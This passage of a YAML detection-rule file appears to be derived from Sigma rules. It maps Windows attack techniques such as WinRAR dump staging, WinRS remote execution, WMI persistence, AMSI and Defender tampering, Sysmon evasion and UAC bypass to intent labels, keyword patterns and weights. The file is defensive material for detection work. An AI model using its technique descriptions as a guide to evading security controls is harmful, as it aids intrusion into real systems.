    summary:
      regex_any:
      - install
      - package
      - winget
      - local
      - manifest
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1ac14d38_3dfc_4635_92c7_e3fd1c5f5bfc
  intent: data_staging
  tactic: collection
  description: Detects execution of WinRAR in order to compress a file with a ".dmp"/".dump"
    extension, which could be a step in a process of dump file exfiltration.
  conditions:
    summary:
      regex_any:
      - winrar
      - compressing
      - dump
      - files
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_146aace8_9bd6_42ba_be7a_0070d8027b76
  intent: execution
  tactic: execution
  description: Detects potentially suspicious child processes of WinRAR.exe.
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - child
      - process
      - winrar
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4ede543c_e098_43d9_a28f_dd784a13132f
  intent: data_staging
  tactic: collection
  description: Detects a suspicious WinRAR execution in a folder which is not the
    default installation folder
  conditions:
    summary:
      regex_any:
      - winrar
      - execution
      - standard
      - folder
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_074e0ded_6ced_4ebd_8b4d_53f55908119d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of attacker-controlled WsmPty.xsl or WsmTxt.xsl via
    winrm.vbs and copied cscript.exe (can be renamed)
  conditions:
    summary:
      regex_any:
      - bypass
      - with
      - winrm
      - malicious
      - wsmpty
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9df0dd3a_1a5c_47e3_a2bc_30ed177646a0
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects an attempt to execute code or create service on remote host
    via winrm.vbs.
  conditions:
    summary:
      regex_any:
      - remote
      - code
      - execute
      - winrm
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_734f8d9b_42b8_41b2_bcf5_abaf49d5a3c8
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects remote PowerShell sections by monitoring for wsmprovhost (WinRM
    host process) as a parent or child process (sign of an active PowerShell remote
    session).
  conditions:
    summary:
      regex_any:
      - remote
      - powershell
      - session
      - host
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5cc2cda8_f261_4d88_a2de_e9e193c86716
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects suspicious processes including shells spawnd from WinRM host
    process
  conditions:
    summary:
      regex_any:
      - suspicious
      - processes
      - spawned
      - winrm
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_79df3f68_dccb_48e9_9171_b75cbc37c51d
  intent: lateral_movement
  tactic: lateral_movement
  description: 'Detects a child process spawned by ''winrshost.exe'', which suggests
    remote command execution through Windows Remote Shell (WinRs) and may indicate
    potential lateral movement activity.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - lateral
      - movement
      - windows
      - remote
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bcfece3d_56fe_4545_9931_3b8e92927db1
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of Winrs.exe where it is used to execute commands
    locally.

    Commands executed this way are launched under Winrshost.exe and can represent
    proxy execution used for defense evasion or lateral movement.

    '
  conditions:
    summary:
      regex_any:
      - winrs
      - local
      - command
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e2e80da2_8c66_4e00_ae3c_2eebd29f6b6d
  intent: data_staging
  tactic: collection
  description: An adversary may compress or encrypt data that is collected prior to
    exfiltration using 3rd party utilities
  conditions:
    summary:
      regex_any:
      - compress
      - data
      - lock
      - with
      - password
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9cfc00b6_bfb7_49ce_9781_ef78503154bb
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of "Wlrmdr.exe" with the "-u" command line flag
    which allows anything passed to it to be an argument of the ShellExecute API,
    which would allow an attacker to execute arbitrary binaries.

    This detection also focuses on any uncommon child processes spawned from "Wlrmdr.exe"
    as a supplement for those that posses "ParentImage" telemetry.

    '
  conditions:
    summary:
      regex_any:
      - wlrmdr
      - uncommon
      - argument
      - child
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ebef4391_1a81_4761_a40a_1db446c0e625
  intent: persistence_installation
  tactic: persistence
  description: Detects WMIC executions in which an event consumer gets created. This
    could be used to establish persistence
  conditions:
    summary:
      regex_any:
      - activescripteventconsumer
      - created
      - wmic
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_51cbac1e_eee3_4a90_b1b7_358efb81fa0a
  intent: execution
  tactic: execution
  description: Detects potential tampering with Windows Defender settings such as
    adding exclusion using wmic
  conditions:
    summary:
      regex_any:
      - potential
      - windows
      - defender
      - tampering
      - wmic
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_526be59f_a573_4eea_b5f7_f0973207634d
  intent: execution
  tactic: execution
  description: Detects new process creation using WMIC via the "process call create"
    flag
  conditions:
    summary:
      regex_any:
      - process
      - created
      - wmic
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9d7ca793_f6bd_471c_8d0f_11e68b2f0d2f
  intent: execution
  tactic: execution
  description: Detects execution of wmic utility with the "computersystem" flag in
    order to obtain information about the machine such as the domain, username, model,
    etc.
  conditions:
    summary:
      regex_any:
      - computer
      - system
      - reconnaissance
      - wmic
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3e3ceccd_6c06_48b8_b5ff_ab1d25db8c1d
  intent: execution
  tactic: execution
  description: Detects the execution of WMIC with the "csproduct" which is used to
    obtain information such as hardware models and vendor information
  conditions:
    summary:
      regex_any:
      - hardware
      - model
      - reconnaissance
      - wmic
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dfd2fcb7_8bd5_4daa_b132_5adb61d6ad45
  intent: execution
  tactic: execution
  description: Detects the execution of wmic with the "qfe" flag in order to obtain
    information about installed hotfix updates on the system. This is often used by
    pentester and attacker enumeration scripts
  conditions:
    summary:
      regex_any:
      - windows
      - hotfix
      - updates
      - reconnaissance
      - wmic
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_221b251a_357a_49a9_920a_271802777cc0
  intent: execution
  tactic: execution
  description: Detects the execution of "wmic" with the "process" flag, which adversary
    might use to list processes running on the compromised host or list installed
    software hotfixes and patches.
  conditions:
    summary:
      regex_any:
      - process
      - reconnaissance
      - wmic
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_15434e33_5027_4914_88d5_3d4145ec25a9
  intent: execution
  tactic: execution
  description: Detects the execution of WMIC in order to get a list of firewall and
    antivirus products
  conditions:
    summary:
      regex_any:
      - potential
      - product
      - reconnaissance
      - wmic
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e568650b_5dcd_4658_8f34_ded0b1e13992
  intent: reconnaissance
  tactic: discovery
  description: 'Detects the execution of WMIC in order to get a list of firewall,
    antivirus and antispywware products.

    Adversaries often enumerate security products installed on a system to identify
    security controls and potential ways to evade detection or disable protection
    mechanisms.

    This information helps them plan their next attack steps and choose appropriate
    techniques to bypass security measures.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - product
      - class
      - reconnaissance
      - wmic
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_76f55eaa_d27f_4213_9d45_7b0e4b60bbae
  intent: execution
  tactic: execution
  description: 'An adversary might use WMI to check if a certain remote service is
    running on a remote device.

    When the test completes, a service information will be displayed on the screen
    if it exists.

    A common feedback message is that "No instance(s) Available" if the service queried
    is not running.

    A common error message is "Node - (provided IP or default) ERROR Description =The
    RPC server is unavailable" if the provided remote host is unreachable

    '
  conditions:
    summary:
      regex_any:
      - service
      - reconnaissance
      - wmic
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9d5a1274_922a_49d0_87f3_8c653483b909
  intent: reconnaissance
  tactic: discovery
  description: 'Detects the use of the WMI command-line (WMIC) utility to identify
    and display various system information,

    including OS, CPU, GPU, and disk drive names; memory capacity; display resolution;
    and baseboard, BIOS,

    and GPU driver products/versions.

    Some of these commands were used by Aurora Stealer in late 2022/early 2023.

    '
  conditions:
    summary:
      regex_any:
      - uncommon
      - system
      - information
      - discovery
      - wmic
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_68bcd73b_37ef_49cb_95fc_edc809730be6
  intent: execution
  tactic: execution
  description: Detects known WMI recon method to look for unquoted service paths using
    wmic. Often used by pentester and attacker enumeration scripts
  conditions:
    summary:
      regex_any:
      - potential
      - unquoted
      - service
      - path
      - reconnaissance
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c79da740_5030_45ec_a2e0_479e824a562c
  intent: reconnaissance
  tactic: discovery
  description: 'An adversary might use WMI to discover information about the system,
    such as the volume name, size,

    free space, and other disk information. This can be done using the ''wmic'' command-line
    utility and has been

    observed being used by threat actors such as Volt Typhoon.

    '
  conditions:
    summary:
      regex_any:
      - system
      - disk
      - volume
      - reconnaissance
      - wmic
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7773b877_5abb_4a3e_b9c9_fd0369b59b00
  intent: execution
  tactic: execution
  description: Detects the execution of WMIC to query information on a remote system
  conditions:
    summary:
      regex_any:
      - wmic
      - remote
      - command
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0b7163dc_7eee_4960_af17_c0cd517f92da
  intent: execution
  tactic: execution
  description: Detects usage of wmic to start or stop a service
  conditions:
    summary:
      regex_any:
      - service
      - started
      - stopped
      - wmic
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8d63dadf_b91b_4187_87b6_34a1114577ea
  intent: execution
  tactic: execution
  description: Detects potential SquiblyTwo attack technique with possible renamed
    WMIC via Imphash and OriginalFileName fields
  conditions:
    summary:
      regex_any:
      - potential
      - squiblytwo
      - technique
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c453ab7a_1f5c_4716_a3b4_dea8135fb43a
  intent: reconnaissance
  tactic: discovery
  description: 'Detects the usage of wmic.exe to manipulate Windows registry via the
    WMI StdRegProv class.

    This behaviour could be potentially suspicious because it uses an alternative
    method to modify registry keys instead of legitimate registry tools like reg.exe
    or regedit.exe.

    Attackers specifically choose this technique to evade detection and bypass security
    monitoring focused on traditional registry modification commands.

    '
  conditions:
    summary:
      regex_any:
      - registry
      - manipulation
      - stdregprov
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e1693bc8_7168_4eab_8718_cdcaa68a1738
  intent: defense_evasion
  tactic: defense_evasion
  description: Office application called wmic to proxye execution through a LOLBIN
    process. This is often used to break suspicious parent-child chain (Office app
    spawns LOLBin).
  conditions:
    summary:
      regex_any:
      - suspicious
      - wmic
      - execution
      - office
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3c89a1e8_0fba_449e_8f1b_8409d6267ec8
  intent: execution
  tactic: execution
  description: Detects WMIC executing "process call create" with suspicious calls
    to processes such as "rundll32", "regsrv32", etc.
  conditions:
    summary:
      regex_any:
      - suspicious
      - process
      - created
      - wmic
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_49d9671b_0a0a_4c09_8280_d215bfd30662
  intent: execution
  tactic: execution
  description: Detects calls to the "terminate" function via wmic in order to kill
    an application
  conditions:
    summary:
      regex_any:
      - application
      - terminated
      - wmic
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b53317a0_8acf_4fd1_8de8_a5401e776b96
  intent: execution
  tactic: execution
  description: Detects the removal or uninstallation of an application via "Wmic.EXE".
  conditions:
    summary:
      regex_any:
      - application
      - removed
      - wmic
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_847d5ff3_8a31_4737_a970_aeae8fe21765
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects uninstallation or termination of security products using the
    WMIC utility
  conditions:
    summary:
      regex_any:
      - potential
      - tampering
      - with
      - security
      - products
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_05c36dd6_79d6_4a9a_97da_3db20298ab2d
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of WMIC with the "format" flag to potentially
    load XSL files.

    Adversaries abuse this functionality to execute arbitrary files while potentially
    bypassing application whitelisting defenses.

    Extensible Stylesheet Language (XSL) files are commonly used to describe the processing
    and rendering of data within XML files.

    '
  conditions:
    summary:
      regex_any:
      - script
      - execution
      - wmic
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d21374ff_f574_44a7_9998_4a8c8bf33d7d
  intent: execution
  tactic: execution
  description: Detects WmiPrvSE spawning a process
  conditions:
    summary:
      regex_any:
      - wmiprvse
      - spawned
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_692f0bec_83ba_4d04_af7e_e884a96059b6
  intent: execution
  tactic: execution
  description: Detects Powershell as a child of the WmiPrvSE process. Which could
    be a sign of lateral movement via WMI.
  conditions:
    summary:
      regex_any:
      - potential
      - lateral
      - movement
      - wmiprvse
      - spawned
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8a582fe2_0882_4b89_a82a_da6b2dc32937
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious and uncommon child processes of WmiPrvSE
  conditions:
    summary:
      regex_any:
      - suspicious
      - wmiprvse
      - child
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_797011dc_44f4_4e6f_9f10_a8ceefbe566b
  intent: persistence_installation
  tactic: persistence
  description: Detects a WMI backdoor in Exchange Transport Agents via WMI event filters
  conditions:
    summary:
      regex_any:
      - backdoor
      - exchange
      - transport
      - agent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7864a175_3654_4824_9f0d_f0da18ab27c0
  intent: persistence_installation
  tactic: persistence
  description: 'Detects the use of wmic.exe to modify user account settings and explicitly
    disable password expiration.

    '
  conditions:
    summary:
      regex_any:
      - password
      - never
      - expire
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ec1d5e28_8f3b_4188_a6f8_6e8df81dc28e
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects WMI script event consumers
  conditions:
    summary:
      regex_any:
      - persistence
      - script
      - event
      - consumer
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4abc0ec4_db5a_412f_9632_26659cddf145
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of the binary "wpbbin" which is used as part of the
    UEFI based persistence method described in the reference section
  conditions:
    summary:
      regex_any:
      - uefi
      - persistence
      - wpbbin
      - processcreation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cea72823_df4d_4567_950c_0b579eaf0846
  intent: execution
  tactic: execution
  description: Detects wscript/cscript executions of scripts located in user directories
  conditions:
    summary:
      regex_any:
      - potential
      - dropper
      - script
      - execution
      - wscript
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b6676963_0353_4f88_90f5_36c20d443c6a
  intent: execution
  tactic: execution
  description: 'Detects potentially suspicious child processes of Wscript/Cscript.
    These include processes such as rundll32 with uncommon exports or PowerShell spawning
    rundll32 or regsvr32.

    Malware such as Pikabot and Qakbot were seen using similar techniques as well
    as many others.

    '
  conditions:
    summary:
      regex_any:
      - cscript
      - wscript
      - potentially
      - suspicious
      - child
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_99b7460d_c9f1_40d7_a316_1f36f61d52ee
  intent: execution
  tactic: execution
  description: Detects Wscript/Cscript executing a file with an uncommon (i.e. non-script)
    extension
  conditions:
    summary:
      regex_any:
      - cscript
      - wscript
      - uncommon
      - script
      - extension
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2267fe65_0681_42ad_9a6d_46553d3f3480
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects uncommon or suspicious child processes spawning from a WSL
    process. This could indicate an attempt to evade parent/child relationship detections
    or persistence attempts via cron using WSL
  conditions:
    summary:
      regex_any:
      - child
      - process
      - anomaly
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_eca8ae39_5c3c_4321_b538_9e64fe25822e
  intent: execution
  tactic: execution
  description: 'Detects installation of Kali Linux distribution through Windows Subsystem
    for Linux (WSL).

    Attackers may use Kali Linux WSL to leverage its penetration testing tools and
    capabilities for malicious purposes.

    '
  conditions:
    summary:
      regex_any:
      - installation
      - kali
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6f1a11aa_4b8a_4b7f_9e13_4d3e4ff0e0d4
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the use of Kali Linux through Windows Subsystem for Linux
  conditions:
    summary:
      regex_any:
      - kali
      - linux
      - usage
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ed825c86_c009_4014_b413_b76003e33d35
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of Windows binaries from within a WSL instance.

    This could be used to masquerade parent-child relationships

    '
  conditions:
    summary:
      regex_any:
      - windows
      - binary
      - executed
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_af77cf95_c469_471c_b6a0_946c685c4798
  intent: execution
  tactic: execution
  description: Detects the use of the Windows Update Client binary (wuauclt.exe) for
    proxy execution.
  conditions:
    summary:
      regex_any:
      - proxy
      - execution
      - wuauclt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_52d097e2_063e_4c9c_8fbb_855c8948d135
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects suspicious Windows Update Agent activity in which a wuauclt.exe
    process command line doesn''t contain any command line flags

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - windows
      - update
      - agent
      - empty
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c74c0390_3e20_41fd_a69a_128f0275a5ea
  intent: execution
  tactic: execution
  description: 'Detects the execution of the "wusa.exe" (Windows Update Standalone
    Installer) utility to extract ".cab" files using the "/extract" argument from
    potentially suspicious paths.

    '
  conditions:
    summary:
      regex_any:
      - file
      - extraction
      - wusa
      - from
      - potentially
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ef64fc9c_a45e_43cc_8fd8_7d75d73b4c99
  intent: execution
  tactic: execution
  description: 'Detects execution of the "wusa.exe" (Windows Update Standalone Installer)
    utility by a parent process that is located in a suspicious location.

    Attackers could instantiate an instance of "wusa.exe" in order to bypass User
    Account Control (UAC). They can duplicate the access token from "wusa.exe" to
    gain elevated privileges.

    '
  conditions:
    summary:
      regex_any:
      - wusa
      - executed
      - parent
      - process
      - located
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_193d5ccd_6f59_40c6_b5b0_8e32d5ddd3d1
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of Xwizard tool from a non-default directory.

    When executed from a non-default directory, this utility can be abused in order
    to side load a custom version of "xwizards.dll".

    '
  conditions:
    summary:
      regex_any:
      - xwizard
      - execution
      - from
      - default
      - location
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_53d4bb30_3f36_4e8a_b078_69d36c4a79ff
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of Xwizard tool with the "RunWizard" flag and
    a GUID like argument.

    This utility can be abused in order to run custom COM object created in the registry.

    '
  conditions:
    summary:
      regex_any:
      - object
      - execution
      - xwizard
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c4b890e5_8d8c_4496_8c66_c805753817cd
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects when a memory process image does not match the disk image,
    indicative of process hollowing.
  conditions:
    summary:
      regex_any:
      - potential
      - process
      - hollowing
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8ac03a65_6c84_4116_acad_dc1558ff7a77
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a Sysmon configuration change, which could be the result of
    a legitimate reconfiguration or someone trying manipulate the configuration
  conditions:
    summary:
      regex_any:
      - sysmon
      - configuration
      - change
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_815cd91b_7dbc_4247_841a_d7dd1392b0a8
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when an adversary is trying to hide it's action from Sysmon
    logging based on error messages
  conditions:
    summary:
      regex_any:
      - sysmon
      - configuration
      - error
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1f2b5353_573f_4880_8e33_7d04dcf97744
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when an attacker tries to hide from Sysmon by disabling or
    stopping it
  conditions:
    summary:
      regex_any:
      - sysmon
      - configuration
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_23b71bc5_953e_4971_be4c_c896cda73fc2
  intent: defense_evasion
  tactic: defense_evasion
  description: Triggers on any Sysmon "FileBlockExecutable" event, which indicates
    a violation of the configured block policy
  conditions:
    summary:
      regex_any:
      - sysmon
      - blocked
      - executable
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c3e5c1b1_45e9_4632_b242_27939c170239
  intent: defense_evasion
  tactic: defense_evasion
  description: Triggers on any Sysmon "FileBlockShredding" event, which indicates
    a violation of the configured shredding policy.
  conditions:
    summary:
      regex_any:
      - sysmon
      - blocked
      - file
      - shredding
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_693a44e9_7f26_4cb6_b787_214867672d3a
  intent: defense_evasion
  tactic: defense_evasion
  description: Triggers on any Sysmon "FileExecutableDetected" event, which triggers
    every time a PE that is monitored by the config is created.
  conditions:
    summary:
      regex_any:
      - sysmon
      - file
      - executable
      - creation
      - detected
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0f06a3a5_6a09_413f_8743_e6cf35561297
  intent: persistence_installation
  tactic: persistence
  description: Detects creation of WMI event subscription persistence method
  conditions:
    summary:
      regex_any:
      - event
      - subscription
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_83844185_1c5b_45bc_bcf3_b5bf3084ca5b
  intent: persistence_installation
  tactic: persistence
  description: Detects suspicious encoded payloads in WMI Event Consumers
  conditions:
    summary:
      regex_any:
      - suspicious
      - encoded
      - scripts
      - consumer
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fe21810c_2a8c_478f_8dd3_5a287fb2a0e0
  intent: execution
  tactic: execution
  description: Detects suspicious commands that are related to scripting/powershell
    in WMI Event Consumers
  conditions:
    summary:
      regex_any:
      - suspicious
      - scripting
      - consumer
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1d218616_71b0_4c40_855b_9dbe75510f7f
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects registry keys related to NetWire RAT
  conditions:
    summary:
      regex_any:
      - potential
      - netwire
      - activity
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_33efc23c_6ea2_4503_8cfe_bdf82ce8f705
  intent: persistence_installation
  tactic: persistence
  description: Detects when an attacker registers a new AMSI provider in order to
    achieve persistence
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - amsi
      - providers
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9b0f8a61_91b2_464f_aceb_0527e0a45020
  intent: persistence_installation
  tactic: persistence
  description: Detects COM object hijacking via TreatAs subkey
  conditions:
    summary:
      regex_any:
      - potential
      - object
      - hijacking
      - treatas
      - subkey
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d4f4e0be_cf12_439f_9e25_4e2cdcf7df5a
  intent: persistence_installation
  tactic: persistence
  description: 'Detects when an attacker modifies values of the Disk Cleanup Handler
    in the registry to achieve persistence.

    The disk cleanup manager is part of the operating system. It displays the dialog
    box []

    The user has the option of enabling or disabling individual handlers by selecting
    or clearing their check box in the disk cleanup manager''s UI.

    Although Windows comes with a number of disk cleanup handlers, they aren''t designed
    to handle files produced by other applications.

    Instead, the disk cleanup manager is designed to be flexible and extensible by
    enabling any developer to implement and register their own disk cleanup handler.

    Any developer can extend the available disk cleanup services by implementing and
    registering a disk cleanup handler.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - disk
      - cleanup
      - handler
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9ace0707_b560_49b8_b6ca_5148b42f39fb
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects creation of "UserInitMprLogonScript" registry value which can
    be used as a persistence method by malicious actors
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - logon
      - scripts
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f50f3c09_557d_492d_81db_9064a8d4e211
  intent: unknown
  tactic: resource_development
  description: Detects the creation of the "accepteula" key related to the Sysinternals
    tools being created from executables with the wrong name (e.g. a renamed Sysinternals
    tool)
  conditions:
    summary:
      regex_any:
      - suspicious
      - execution
      - renamed
      - sysinternals
      - tools
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c7da8edc_49ae_45a2_9e61_9fd860e4e73d
  intent: unknown
  tactic: resource_development
  description: Detects the execution of some potentially unwanted tools such as PsExec,
    Procdump, etc. (part of the Sysinternals suite) via the creation of the "accepteula"
    registry key.
  conditions:
    summary:
      regex_any:
      - sysinternals
      - tools
      - execution
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_72a0369a_2576_4aaf_bfc9_6bb24a574ac6
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects deletion of registry key that adds 'Scan with Defender' option
    in context menu. Attackers may use this to make it harder for users to scan files
    that are suspicious.
  conditions:
    summary:
      regex_any:
      - delete
      - defender
      - scan
      - shellex
      - context
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5dfc1465_8f65_4fde_8eb5_6194380c6a62
  intent: data_staging
  tactic: collection
  description: 'Detects the enabling of the Windows Recall feature via registry manipulation.
    Windows Recall can be enabled by deleting the existing "DisableAIDataAnalysis"
    registry value.

    Adversaries may enable Windows Recall as part of post-exploitation discovery and
    collection activities.

    This rule assumes that Recall is already explicitly disabled on the host, and
    subsequently enabled by the adversary.

    '
  conditions:
    summary:
      regex_any:
      - windows
      - recall
      - feature
      - enabled
      - disableaidataanalysis
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_272e55a4_9e6b_4211_acb6_78f51f0b1b40
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the removal of folders from the "ProtectedFolders" list of
    of exploit guard. This could indicate an attacker trying to launch an encryption
    process or trying to manipulate data inside of the protected folder
  conditions:
    summary:
      regex_any:
      - folder
      - removed
      - from
      - exploit
      - guard
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_07bdd2f5_9c58_4f38_aec8_e101bb79ef8d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the deletion of registry keys containing the MSTSC connection
    history
  conditions:
    summary:
      regex_any:
      - terminal
      - server
      - client
      - connection
      - history
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_41d1058a_aea7_4952_9293_29eaaf516465
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the deletion of AMSI provider registry key entries in HKLM\Software\Microsoft\AMSI.
    This technique could be used by an attacker in order to disable AMSI inspection.
  conditions:
    summary:
      regex_any:
      - removal
      - amsi
      - provider
      - registry
      - keys
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_96f697b0_b499_4e5d_9908_a67bec11cdb6
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects any deletion of entries in ".*\shell\open\command" registry
    keys.

    These registry keys might have been used for COM hijacking activities by a threat
    actor or an attacker and the deletion could indicate steps to remove its tracks.

    '
  conditions:
    summary:
      regex_any:
      - removal
      - potential
      - hijacking
      - registry
      - keys
  weights:
    base: 0.6
    indicators_bonus: 0.1
